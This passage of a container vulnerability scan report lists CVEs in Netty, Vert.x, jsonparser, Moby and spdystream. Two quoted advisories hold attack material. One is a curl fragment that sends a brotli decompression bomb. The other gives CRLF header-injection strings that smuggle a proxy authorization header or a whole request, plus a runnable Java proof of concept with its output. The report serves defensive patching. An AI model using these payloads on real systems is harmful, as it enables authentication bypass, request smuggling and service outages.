│     │      │                   # This bypasses the limit — BrotliDecoder has no maxAllocation
│     │      │                     -H 'Content-Encoding: br' \
│     │      │                     --data-binary @bomb.br
│     │      │                   # Result: Full 1GB decompressed into memory → OOM
│     │      │                   5. The same bypass works with `Content-Encoding: zstd` and `Content-Encoding:
│     │      │                   snappy`.
│     │      │                   ## Impact
│     │      │                   - **Denial of Service**: An attacker can cause out-of-memory conditions on any
│     │      │                    Netty server that relies on `maxAllocation` for decompression bomb
│     │      │                   protection, by simply using a non-gzip content encoding.
│     │      │                   - **False sense of security**: Developers who explicitly configure
│     │      │                   `maxAllocation` to protect against decompression bombs are not actually
│     │      │                   protected for brotli, zstd, or snappy encodings. The API documentation implies
│     │      │                    all encodings are covered.
│     │      │                   - **Trivial bypass**: The attacker only needs to change one HTTP header
│     │      │                   (`Content-Encoding: br` instead of `Content-Encoding: gzip`) to circumvent the
│     │      │                    protection entirely.
│     │      │                   - **Both HTTP/1.1 and HTTP/2**: The vulnerability exists in both
│     │      │                   `HttpContentDecompressor` (HTTP/1.1) and `DelegatingDecompressorFrameListener`
│     │      │                    (HTTP/2).
│     │      │                   ## Recommended Fix
│     │      │                   Pass `maxAllocation` to all decoder constructors. For `BrotliDecoder`, which
│     │      │                   currently has no `maxAllocation` support, add the parameter:
│     │      │                   **HttpContentDecompressor.java** — pass maxAllocation to all decoders:
│     │      │                   // Line 120: BrotliDecoder — add maxAllocation support
│     │      │                   .handlers(new BrotliDecoder(maxAllocation))
│     │      │                   // Line 129: SnappyFrameDecoder — add maxAllocation support
│     │      │                   .handlers(new SnappyFrameDecoder(maxAllocation))
│     │      │                   // Line 138: ZstdDecoder — forward the configured maxAllocation
│     │      │                   .handlers(new ZstdDecoder(maxAllocation))
│     │      │                   **DelegatingDecompressorFrameListener.java** — same fix at lines 188-210.
│     │      │                   **BrotliDecoder** — add `maxAllocation` parameter with the same semantics as
│     │      │                   `ZlibDecoder.prepareDecompressBuffer()`: set buffer maxCapacity and throw
│     │      │                   `DecompressionException` when the total decompressed output exceeds the
│     │      │                   limit.
│     │      │                   **SnappyFrameDecoder** — add `maxAllocation` parameter with equivalent
│     │      │                   enforcement.
│     │      │                   **ZstdDecoder** — ensure that when `maxAllocation` is set, total output across
│     │      │                    all buffers is bounded (not just per-buffer allocation size). 
│     │      ├ Severity        : HIGH 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                         ╰ V3Score : 7.5 
│     │      ╰ References       ╭ [0]: https://github.com/netty/netty 
│     │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA-f6hv-jmp6-3vwv 
│     ├ [9]  ╭ VulnerabilityID : CVE-2026-42578 
│     │      ├ VendorIDs        ─ [0]: GHSA-45q3-82m4-75jr 
│     │      ├ PkgName         : io.netty:netty-handler-proxy 
│     │      ├ PkgPath         : openaf/Kube/netty-handler-proxy-4.2.12.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-handler-proxy@4.2.12.Final 
│     │      │                  ╰ UID : 8344d1e8c7524c10 
│     │      ├ InstalledVersion: 4.2.12.Final 
│     │      ├ FixedVersion    : 4.1.133.Final, 4.2.13.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42578 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:aa15fe3dcf08db7c3f10a9ccba00452f3843284bb60032501376d617c48f559a 
│     │      ├ Title           : Netty has HTTP Header Injection via HttpProxyHandler Disabled Validation
│     │      │                   (Incomplete Fix CVE-2025-67735) 
│     │      ├ Description     : # Security Vulnerability Report: HTTP Header Injection via HttpProxyHandler
│     │      │                   Disabled Validation in Netty
│     │      │                   
│     │      │                   ## 1. Vulnerability Summary
│     │      │                   | Field | Value |
│     │      │                   |-------|-------|
│     │      │                   | **Product** | Netty |
│     │      │                   | **Version** | 4.2.12.Final (and all prior versions) |
│     │      │                   | **Component** | `io.netty.handler.proxy.HttpProxyHandler` |
│     │      │                   | **Vulnerability Type** | CWE-113: Improper Neutralization of CRLF Sequences
│     │      │                   in HTTP Headers |
│     │      │                   | **Impact** | HTTP Header Injection in CONNECT Proxy Requests |
│     │      │                   | **CVSS 3.1 Score** | **7.5 (High)** |
│     │      │                   | **CVSS 3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
│     │      │                   | **Related Advisory** | **GHSA-84h7-rjj3-6jx4** (Incomplete Fix) |
│     │      │                   ## 2. Affected Components
│     │      │                   - `io.netty.handler.proxy.HttpProxyHandler` — `newInitialMessage()` method
│     │      │                   (line 176) explicitly disables header validation via `withValidation(false)`
│     │      │                   ## 3. Vulnerability Description
│     │      │                   Netty's `HttpProxyHandler` constructs HTTP CONNECT requests with **header
│     │      │                   validation explicitly disabled**. The `newInitialMessage()` method (line 176)
│     │      │                   creates headers using
│     │      │                   `DefaultHttpHeadersFactory.headersFactory().withValidation(false)`, then adds
│     │      │                   user-provided `outboundHeaders` (line 188-190) without any CRLF validation.
│     │      │                   This allows an attacker who can influence the outbound headers to inject
│     │      │                   arbitrary HTTP headers into the CONNECT request sent to the proxy server.
│     │      │                   ### Root Cause
│     │      │                   ```java
│     │      │                   // HttpProxyHandler.java:176-190
│     │      │                   protected Object newInitialMessage(ChannelHandlerContext ctx) throws Exception
│     │      │                    {
│     │      │                       // ...
│     │      │                       HttpHeadersFactory headersFactory =
│     │      │                   DefaultHttpHeadersFactory.headersFactory()
│     │      │                           .withValidation(false);  // <-- VALIDATION EXPLICITLY DISABLED
│     │      │                       FullHttpRequest req = new DefaultFullHttpRequest(
│     │      │                           HttpVersion.HTTP_1_1, HttpMethod.CONNECT,
│     │      │                           url, Unpooled.EMPTY_BUFFER, headersFactory, headersFactory);
│     │      │                       req.headers().set(HttpHeaderNames.HOST, hostHeader);
│     │      │                       if (authorization != null) {
│     │      │                           req.headers().set(HttpHeaderNames.PROXY_AUTHORIZATION,
│     │      │                   authorization);
│     │      │                       }
│     │      │                       if (outboundHeaders != null) {
│     │      │                           req.headers().add(outboundHeaders);  // <-- USER HEADERS ADDED WITHOUT
│     │      │                    VALIDATION
│     │      │                       return req;
│     │      │                   }
│     │      │                   ```
│     │      │                   The `outboundHeaders` parameter comes from the `HttpProxyHandler` constructor
│     │      │                   (lines 80-93, 99-127), which is supplied by application code.
│     │      │                   ### Incomplete Fix of GHSA-84h7-rjj3-6jx4
│     │      │                   **This vulnerability represents an incomplete fix of the previously
│     │      │                   acknowledged security advisory
│     │      │                   [GHSA-84h7-rjj3-6jx4](https://github.com/netty/netty/security/advisories/GHSA-
│     │      │                   84h7-rjj3-6jx4).**
│     │      │                   The GHSA-84h7-rjj3-6jx4 fix addressed HTTP CRLF injection by adding URI
│     │      │                   validation via `validateRequestLineTokens()` in `DefaultHttpRequest` and
│     │      │                   enabling header validation by default through `DefaultHttpHeadersFactory`.
│     │      │                   However, `HttpProxyHandler` **explicitly opts out** of the fix by calling
│     │      │                   `withValidation(false)`, creating a gap where:
│     │      │                   1. The GHSA-84h7-rjj3-6jx4 fix's header validation is bypassed
│     │      │                   2. User-provided `outboundHeaders` are added without any CRLF check
│     │      │                   3. The resulting CONNECT request contains unvalidated headers on the wire
│     │      │                   This is not a new vulnerability class — it is the **same CRLF injection** that
│     │      │                    GHSA-84h7-rjj3-6jx4 was supposed to fix, but `HttpProxyHandler` was missed
│     │      │                   during the remediation. The fix for GHSA-84h7-rjj3-6jx4 should be extended to
│     │      │                   cover this code path.
│     │      │                   ## 4. Exploitability Prerequisites
│     │      │                   This vulnerability is exploitable when:
│     │      │                   1. An application uses `HttpProxyHandler` with user-influenced
│     │      │                   `outboundHeaders`
│     │      │                   2. The application does not perform its own CRLF sanitization on header
│     │      │                   values
│     │      │                   **Common affected patterns**:
│     │      │                   - HTTP proxy clients that forward user-specified custom headers
│     │      │                   - Web scraping frameworks that allow users to set proxy headers
│     │      │                   - API gateways that pass user headers through a proxy tunnel
│     │      │                   ## 5. Attack Scenarios
│     │      │                   ### Scenario 1: Proxy Authentication Bypass
│     │      │                   HttpHeaders headers = new DefaultHttpHeaders(false);
│     │      │                   headers.set("X-Forwarded-For", userInput);  // userInput from attacker
│     │      │                   new HttpProxyHandler(proxyAddr, headers);
│     │      │                   **Attack input**: `userInput = "1.2.3.4\r\nProxy-Authorization: Basic
│     │      │                   YWRtaW46YWRtaW4="`
│     │      │                   **Wire format**:
│     │      │                   CONNECT target.com:443 HTTP/1.1
│     │      │                   host: target.com:443
│     │      │                   X-Forwarded-For: 1.2.3.4
│     │      │                   Proxy-Authorization: Basic YWRtaW46YWRtaW4=    <-- INJECTED
│     │      │                   The injected `Proxy-Authorization` header may override or supplement the
│     │      │                   original authentication, potentially granting access to a restricted proxy.
│     │      │                   ### Scenario 2: Request Smuggling via Proxy
│     │      │                   **Attack input**: `userInput = "value\r\nTransfer-Encoding:
│     │      │                   chunked\r\n\r\n0\r\n\r\nGET /internal HTTP/1.1\r\nHost: internal-service"`
│     │      │                   Injects a full smuggled request through the proxy tunnel establishment.
│     │      │                   ## 6. Proof of Concept
│     │      │                   ### Full Runnable PoC Source Code (HttpProxyHeaderInjectionPoC.java)
│     │      │                   import io.netty.buffer.ByteBuf;
│     │      │                   import io.netty.channel.embedded.EmbeddedChannel;
│     │      │                   import io.netty.handler.codec.http.*;
│     │      │                   import java.nio.charset.StandardCharsets;
│     │      │                   public class HttpProxyHeaderInjectionPoC {
│     │      │                       public static void main(String[] args) {
│     │      │                           System.out.println("=== Netty HttpProxyHandler Header Injection PoC
│     │      │                   ===\n");
│     │      │                           // Simulate HttpProxyHandler.newInitialMessage() with
│     │      │                   validation=false
│     │      │                           HttpHeadersFactory headersFactory =
│     │      │                               .withValidation(false);
│     │      │                           FullHttpRequest req = new DefaultFullHttpRequest(
│     │      │                               HttpVersion.HTTP_1_1, HttpMethod.CONNECT,
│     │      │                               "target.com:443",
│     │      │                               io.netty.buffer.Unpooled.EMPTY_BUFFER, headersFactory,
│     │      │                   headersFactory);
│     │      │                           req.headers().set(HttpHeaderNames.HOST, "target.com:443");
│     │      │                           // Inject CRLF in header value
│     │      │                           String malicious = "1.2.3.4\r\nX-Forwarded-For: 127.0.0.1\r\nX-Admin:
│     │      │                   true";
│     │      │                           req.headers().set("X-Forwarded-For", malicious);
│     │      │                           // Encode to wire format
│     │      │                           EmbeddedChannel ch = new EmbeddedChannel(new HttpRequestEncoder());
│     │      │                           ch.writeOutbound(req);
│     │      │                           ByteBuf out = ch.readOutbound();
│     │      │                           String encoded = out.toString(StandardCharsets.UTF_8);
│     │      │                           out.release();
│     │      │                           ch.finishAndReleaseAll();
│     │      │                           System.out.println("Wire format:");
│     │      │                           for (String line : encoded.split("\n", -1)) {
│     │      │                               System.out.println("  " + line.replace("\r", "\\r"));
│     │      │                           }
│     │      │                           System.out.println("Injected X-Admin: " + encoded.contains("X-Admin:
│     │      │                   true"));
│     │      │                           System.out.println("VULNERABLE: " +
│     │      │                               (encoded.contains("X-Admin: true") ? "YES" : "NO"));
│     │      │                   ### PoC Execution Output (Verified on Netty 4.2.12.Final)
│     │      │                   === Netty HttpProxyHandler Header Injection PoC ===
│     │      │                   [TEST 1] outboundHeaders with CRLF (validation disabled)
│     │      │                   ----------------------------------------------------------
│     │      │                     Injected header value: "1.2.3.4\r\nX-Forwarded-For: 127.0.0.1\r\nX-Admin:
│     │      │                   true"
│     │      │                     Header accepted: YES (validation disabled!)
│     │      │                     Wire format:
│     │      │                       CONNECT target.com:443 HTTP/1.1\r
│     │      │                       host: target.com:443\r
│     │      │                       X-Forwarded-For: 1.2.3.4\r
│     │      │                       X-Forwarded-For: 127.0.0.1\r          <-- INJECTED
│     │      │                       X-Admin: true\r                        <-- INJECTED
│     │      │                       \r
│     │      │                     Injected X-Admin header in wire: true
│     │      │                     VULNERABLE: YES
│     │      │                   [TEST 2] validation=true vs validation=false comparison
│     │      │                   --------------------------------------------------------
│     │      │                     With validation=true:
│     │      │                       SAFE: Rejected - IllegalArgumentException
│     │      │                     With validation=false:
│     │      │                       VULNERABLE: Accepted CRLF in header value!
│     │      │                       Stored value contains CRLF: true
│     │      │                   ## 7. Remediation Recommendations
│     │      │                   ### Option 1: Remove withValidation(false)
│     │      │                   // Change HttpProxyHandler.java line 176 from:
│     │      │                   HttpHeadersFactory headersFactory =
│     │      │                   DefaultHttpHeadersFactory.headersFactory().withValidation(false);
│     │      │                   // To:
│     │      │                   DefaultHttpHeadersFactory.headersFactory();
│     │      │                   ### Option 2: Validate outboundHeaders Before Adding
│     │      │                   if (outboundHeaders != null) {
│     │      │                       for (Map.Entry<String, String> entry : outboundHeaders) {
│     │      │                           HttpUtil.validateHeaderValue(entry.getValue());
│     │      │                       req.headers().add(outboundHeaders);
│     │      │                   ## 8. Resources
│     │      │                   - [GHSA-84h7-rjj3-6jx4: Netty HTTP CRLF Injection (**incomplete fix — this
│     │      │                   report**)](https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6
│     │      │                   jx4)
│     │      │                   - [CWE-113: Improper Neutralization of CRLF Sequences in HTTP
│     │      │                   Headers](https://cwe.mitre.org/data/definitions/113.html) 
│     │      ├ Severity        : LOW 
│     │      ├ VendorSeverity   ─ ghsa: 1 
│     │      ╰ References       ╭ [0]: https://github.com/advisories/GHSA-84h7-rjj3-6jx4 
│     │                         ├ [1]: https://github.com/netty/netty 
│     │                         ╰ [2]: https://github.com/netty/netty/security/advisories/GHSA-45q3-82m4-75jr 
│     ╰ [10] ╭ VulnerabilityID : CVE-2026-6860 
│            ├ VendorIDs        ─ [0]: GHSA-3g76-f9xq-8vp6 
│            ├ PkgName         : io.vertx:vertx-core 
│            ├ PkgPath         : openaf/Kube/vertx-core-4.5.24.jar 
│            ├ PkgIdentifier    ╭ PURL: pkg:maven/io.vertx/vertx-core@4.5.24 
│            │                  ╰ UID : afaef31c626f9650 
│            ├ InstalledVersion: 4.5.24 
│            ├ Status          : affected 
│            ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│            │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│            ├ SeveritySource  : ghsa 
│            ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-6860 
│            ├ DataSource       ╭ ID  : ghsa 
│            │                  ├ Name: GitHub Security Advisory Maven 
│            │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│            ├ Fingerprint     : sha256:bf553e9d2d2eb99d39b159dd26e8b834b1f321f72f7ce9f5b496b5fef5de2fa6 
│            ├ Title           : Vert.x has a DoS via unbounded server-side SNI SslContext cache growth 
│            ├ Description     : A TCP client can perform a TLS handshake and present the server name extension
│            │                    with a server name that is accepted by a server wildcard name, e.g. if the
│            │                   server is configured with a certificate accepting *.example.com, any
│            │                   XYZ.example.com where xyz is a valid name can be used. 
│            ├ Severity        : MEDIUM 
│            ├ VendorSeverity   ─ ghsa: 2 
│            ├ CVSS             ─ ghsa ╭ V3Vector : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L 
│            │                         ├ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/
│            │                         │            SA:L 
│            │                         ├ V3Score  : 5.3 
│            │                         ╰ V40Score : 6.9 
│            ├ References       ╭ [0]: https://github.com/eclipse-vertx/vert.x 
│            │                  ├ [1]: https://github.com/eclipse-vertx/vert.x/pull/6102 
│            │                  ├ [2]: https://github.com/eclipse-vertx/vert.x/security/advisories/GHSA-3g76-f9
│            │                  │      xq-8vp6 
│            │                  ├ [3]: https://gitlab.eclipse.org/security/vulnerability-reports/-/issues/381 
│            │                  ╰ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-6860 
│            ├ PublishedDate   : 2026-05-06T10:16:26.293Z 
│            ╰ LastModifiedDate: 2026-05-07T14:52:27.38Z 
├ [1] ╭ [0]  ╭ VulnerabilityID : CVE-2026-32285 
│     │      ├ VendorIDs        ─ [0]: GHSA-6g7g-w4f8-9c9x 
│     │      ├ PkgID           : github.com/buger/jsonparser@v1.1.1 
│     │      ├ PkgName         : github.com/buger/jsonparser 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/buger/jsonparser@v1.1.1 
│     │      │                  ╰ UID : ca4c6b1f9a21412b 
│     │      ├ InstalledVersion: v1.1.1 
│     │      ├ FixedVersion    : 1.1.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32285 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:eac7527d8586c4baaebda40b3a31ee3a3aed60ee63fbd189312324ee5e88f7cb 
│     │      ├ Title           : github.com/buger/jsonparser: github.com/buger/jsonparser: Denial of Service
│     │      │                   via malformed JSON input 
│     │      ├ Description     : The Delete function fails to properly validate offsets when processing
│     │      │                   malformed JSON input. This can lead to a negative slice index and a runtime
│     │      │                   panic, allowing a denial of service attack. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-129 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │        ╰ V3Score : 7.5 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/security/cve/CVE-2026-32285 
│     │      │                  ├ [1] : https://github.com/buger/jsonparser 
│     │      │                  ├ [2] : https://github.com/buger/jsonparser/commit/a69e7e01cd4ad67bdfd3ac2c080b
│     │      │                  │       9212af16f4b0 
│     │      │                  ├ [3] : https://github.com/buger/jsonparser/issues/275 
│     │      │                  ├ [4] : https://github.com/buger/jsonparser/pull/276 
│     │      │                  ├ [5] : https://github.com/buger/jsonparser/releases/tag/v1.1.2 
│     │      │                  ├ [6] : https://github.com/golang/vulndb/issues/4514 
│     │      │                  ├ [7] : https://nvd.nist.gov/vuln/detail/CVE-2026-32285 
│     │      │                  ├ [8] : https://pkg.go.dev/vuln/GO-2026-4514 
│     │      │                  ├ [9] : https://securityinfinity.com/research/buger-jsonparser-negative-slice-p
│     │      │                  │       anic-dos-2026 
│     │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2026-32285 
│     │      ├ PublishedDate   : 2026-03-26T20:16:12.197Z 
│     │      ╰ LastModifiedDate: 2026-04-21T15:42:07.52Z 
│     ├ [1]  ╭ VulnerabilityID : CVE-2026-34040 
│     │      ├ VendorIDs        ─ [0]: GHSA-x744-4wpc-v9h2 
│     │      ├ PkgID           : github.com/docker/docker@v28.3.3+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.3.3%2Bincompatible 
│     │      │                  ╰ UID : a108c38e2d3411ae 
│     │      ├ InstalledVersion: v28.3.3+incompatible 
│     │      ├ FixedVersion    : 29.3.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-34040 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:18eb388bf81e76221b40ec56a82ade882c6635509a731fba25f371b0ddf0d2a1 
│     │      ├ Title           : Moby: Moby: Authorization bypass vulnerability 
│     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
│     │      │                   security vulnerability has been detected that allows attackers to bypass
│     │      │                   authorization plugins (AuthZ). This issue has been patched in version
│     │      │                   29.3.1. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-288 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ├ nvd   : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 8.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 7.8 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-34040 
│     │      │                  ├ [1]: https://docs.docker.com/engine/extend/plugins_authorization 
│     │      │                  ├ [2]: https://github.com/moby/moby 
│     │      │                  ├ [3]: https://github.com/moby/moby/commit/e89edb19ad7de0407a5d31e3111cb01aa10b
│     │      │                  │      5a38 
│     │      │                  ├ [4]: https://github.com/moby/moby/releases/tag/docker-v29.3.1 
│     │      │                  ├ [5]: https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq 
│     │      │                  ├ [6]: https://github.com/moby/moby/security/advisories/GHSA-x744-4wpc-v9h2 
│     │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-34040 
│     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-34040 
│     │      ├ PublishedDate   : 2026-03-31T03:15:57.883Z 
│     │      ╰ LastModifiedDate: 2026-04-03T16:51:28.67Z 
│     ├ [2]  ╭ VulnerabilityID : CVE-2026-33997 
│     │      ├ VendorIDs        ─ [0]: GHSA-pxq6-2prw-chj9 
│     │      ├ PkgID           : github.com/docker/docker@v28.3.3+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.3.3%2Bincompatible 
│     │      │                  ╰ UID : a108c38e2d3411ae 
│     │      ├ InstalledVersion: v28.3.3+incompatible 
│     │      ├ FixedVersion    : 29.3.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33997 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:5197a83c0aa2453da9e9dd0010a8b2ca7514ba3147f189e0d4b529a32f004390 
│     │      ├ Title           : moby: docker: github.com/moby/moby: Moby: Privilege validation bypass during
│     │      │                   plugin installation 
│     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
│     │      │                   security vulnerability has been detected that allows plugins privilege
│     │      │                   validation to be bypassed during docker plugin install. Due to an error in the
│     │      │                    daemon's privilege comparison logic, the daemon may incorrectly accept a
│     │      │                   privilege set that differs from the one approved by the user. Plugins that
│     │      │                   request exactly one privilege are also affected, because no comparison is
│     │      │                   performed at all. This issue has been patched in version 29.3.1. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-193 
│     │      ├ VendorSeverity   ╭ amazon: 2 
│     │      │                  ├ ghsa  : 2 
│     │      │                  ├ nvd   : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 6.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 8.1 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H 
│     │      │                           ╰ V3Score : 8.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-33997 
│     │      │                  ├ [1]: https://docs.docker.com/engine/extend/legacy_plugins 
│     │      │                  ├ [2]: https://github.com/moby/moby 
│     │      │                  ├ [3]: https://github.com/moby/moby/commit/f4d6f25bf0c3fa12d4968320a45685947756
│     │      │                  │      a22a 
│     │      │                  ├ [4]: https://github.com/moby/moby/releases/tag/docker-v29.3.1 
│     │      │                  ├ [5]: https://github.com/moby/moby/security/advisories/GHSA-pxq6-2prw-chj9 
│     │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-33997 
│     │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-33997 
│     │      ├ PublishedDate   : 2026-03-31T03:15:57.523Z 
│     │      ╰ LastModifiedDate: 2026-04-03T17:23:21.307Z 
│     ├ [3]  ╭ VulnerabilityID : CVE-2026-35469 
│     │      ├ VendorIDs        ─ [0]: GHSA-pc3f-x583-g7j2 
│     │      ├ PkgID           : github.com/moby/spdystream@v0.5.0 
│     │      ├ PkgName         : github.com/moby/spdystream 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/moby/spdystream@v0.5.0 
│     │      │                  ╰ UID : 2ebdf32ca1a4f777 
│     │      ├ InstalledVersion: v0.5.0 
│     │      ├ FixedVersion    : 0.5.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-35469 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:209b938840eed23767497e2cd2d60f20accfb838d9dfcb6bec530f22ff1cb59b 
│     │      ├ Title           : Kubelet: CRI-O: kube-apiserver: Kubelet, CRI-O, kube-apiserver: Denial of
│     │      │                   Service via SPDY streaming code 
│     │      ├ Description     : spdystream is a Go library for multiplexing streams over SPDY connections. In
│     │      │                   versions 0.5.0 and below, the SPDY/3 frame parser does not validate
│     │      │                   attacker-controlled counts and lengths before allocating memory. Three
│     │      │                   allocation paths are affected: the SETTINGS frame entry count, the header
│     │      │                   count in parseHeaderValueBlock, and individual header field sizes — all read
│     │      │                   as 32-bit integers and used directly as allocation sizes with no bounds
│     │      │                   checking. Because SPDY header blocks are zlib-compressed, a small on-the-wire
│     │      │                   payload can decompress into large attacker-controlled values. A remote peer
│     │      │                   that can send SPDY frames to a service using spdystream can exhaust process
│     │      │                   memory and cause an out-of-memory crash with a single crafted control frame.
│     │      │                   This issue has been fixed in version 0.5.1. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ azure : 3 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:
│     │      │                  │        │            N/SA:N 
│     │      │                  │        ╰ V40Score : 8.7 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 6.5 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-35469 
